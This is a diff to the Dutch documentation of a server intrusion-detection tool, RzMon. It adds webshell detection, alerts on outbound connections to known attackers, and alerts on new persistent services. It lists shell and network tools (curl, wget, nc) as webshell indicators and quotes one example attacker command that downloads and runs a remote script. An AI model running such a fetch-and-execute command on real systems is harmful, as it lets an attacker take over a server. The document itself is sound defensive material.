@@ -1547,6 +1547,10 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 | Nieuw of gewijzigd bestand: `/etc/passwd`, `shadow`, `group`, sshd-config, crontabs en `/etc/cron.d`, `authorized_keys` van gebruikers, eigen systemd-services en -timers, `rc.local`, `/etc/profile.d`; vanaf agent 1.54.0 ook `/etc/hosts`, `/etc/resolv.conf`, `/etc/environment`, `at`-jobs, `.bashrc`/`.bash_profile`/`.profile` van root en systemd-gebruikersunits | 🟠 warning |
 | **Lid erbij van een groep die (bijna) root is**: `wheel`, `sudo`, `docker`, `root`, `adm`, `lxd` (agent 1.54.0) | 🔴 critical |
 | **🍯 Honeypot** (zie hieronder): een inlogpoging met een honeypot-naam, of een verbinding met de honeypot-poort; van buiten meteen geblokkeerd | 🟠 warning (van buiten) · 🔴 critical (vanaf je eigen netwerk) |
+| **🕸️ Mogelijke webshell** (vanaf 1.87.0): een webserver start een shell of een programma als `curl` | 🔴 critical |
+| **🌐 Uitgaande verbinding naar een bekende aanvaller** (vanaf 1.87.0) | 🔴 critical |
+| Uitgaande verbinding naar een land buiten je normale landen (vanaf 1.87.0) | 🟠 warning |
+| Nieuwe automatisch startende dienst of timer (vanaf 1.87.0) | 🟠 warning |
 | Tweede root-account (UID 0) | 🔴 critical |
 | Nieuwe gebruiker | 🟠 warning |
 | Nieuwe luisterende poort | 🟠 warning |
@@ -1576,6 +1580,24 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
 - **Honeypot-poort** (standaard TCP **2323**, leeg = uit): niemand van jou maakt daar verbinding mee, dus elke verbinding is een scanner. Er luistert niets: de agent zet een regel in zijn eigen firewalltabel (`inet rzmon`) die het IP onthoudt en de verbinding stil weggooit. Werkt ook in de modus *leren* (dan alleen melden). Is de poort op een server in gebruik, dan staat dat bij die server bovenaan de pagina IDS. RzMon zelf (bv. een poortscan) telt niet mee.
 - **Vanaf je eigen netwerk** is het 🔴 **critical**, met Pushover: een apparaat in je LAN dat dit doet, is waarschijnlijk besmet (camera, slimme stekker). LAN-adressen worden nooit automatisch geblokkeerd.
 - Op de pagina IDS staan ze onder het filter **🍯 Honeypot**.
+
+**🕸️ Webshell en persistentie** (vanaf 1.87.0, agent 1.56.0; *Instellingen → 🛡️ IDS*)
+- **Webshell:** een webserver (nginx, apache, php-fpm, lighttpd, caddy …) of een webgebruiker (`www-data`, `apache` …) start een shell (`sh`, `bash`) of een netwerkprogramma (`curl`, `wget`, `nc`, `python`, `perl` …). Dat hoort nooit; meestal is via een lek in een website een opdracht uitgevoerd.
+  - Critical, ook naar Pushover.
+  - PHP-mail via `sendmail` telt niet.
+  - **Voorbeeld:** een lek in een WordPress-plugin. De aanvaller laat de site `sh -c "curl http://…/x.sh | sh"` uitvoeren. De agent ziet `php-fpm` → `sh` → `curl` en RzMon meldt *Mogelijke webshell: php-fpm start sh*.
+- **Proces stoppen** (modus *blokkeren*, schakelaar *proces meteen stoppen*, standaard uit): de agent stopt het proces bij zijn volgende ronde.
+  - Hij controleert eerst of het nog precies hetzelfde proces is (nummer én starttijd), zodat nooit een ander proces geraakt wordt.
+  - Het incident vermeldt *⛔ pid … gestopt*.
+- **✅ Vrijgeven:** is het toch normaal (een beheerpaneel dat scripts start), dan klik je bij het incident *Vrijgeven*. Dezelfde combinatie (webserver, programma, begin van de opdracht) wordt daarna niet meer gemeld of gestopt.
+- **Nieuwe automatisch startende dienst of timer:** elke 10 minuten de lijst met ingeschakelde systemd-services en -timers. Een nieuwe geeft een warning: zo blijft een aanvaller na een herstart aanwezig. Tijdens een pakketupdate wordt hij stil vastgelegd. Nieuwe cronjobs en unit-bestanden zag de IDS al via de gevoelige bestanden.
+
+**🌐 Uitgaande verbindingen** (vanaf 1.87.0, agent 1.56.0)
+- De agent stuurt elke minuut naar welke adressen buiten je netwerk de server verbindt, per programma (hooguit 100).
+- **Naar een bekende aanvaller** (Spamhaus, FireHOL): critical. Dit wijst bijna altijd op malware: een cryptominer, of een verbinding met de aanvaller (command-and-control). Zo vang je een server die al gehackt is.
+- **Naar een land buiten je normale landen**: warning, per programma en land. Tijdens de basismeting leert de IDS dat stil aan, dus updates via de VS geven geen meldingen. Later toch normaal? Klik *Dit is normaal*.
+- **Uitgaand blokkeren** (modus *blokkeren*, standaard uit): verkeer naar bekende aanvallers wordt in de firewalltabel `inet rzmon` ook uitgaand tegengehouden, ook vanuit containers (Docker, Podman).
+- **✅ Vrijgeven:** zet het IP op de ✅ whitelist (1, 7, 30 dagen of altijd). Dan wordt het niet meer gemeld en niet meer geblokkeerd.
 
 **🌐 Automatische blokkades op alle servers** (vanaf 1.81.0, standaard aan): wordt een aanvaller op één server automatisch geblokkeerd (brute force, honeypot), dan blokkeren al je servers met de IDS op *blokkeren* hem ook. Een botnet probeert meestal al je servers die van buiten bereikbaar zijn. Met de hand blokkeren geldt alleen voor de server die je kiest. Uit te zetten bij *Instellingen → 🛡️ IDS*.
 
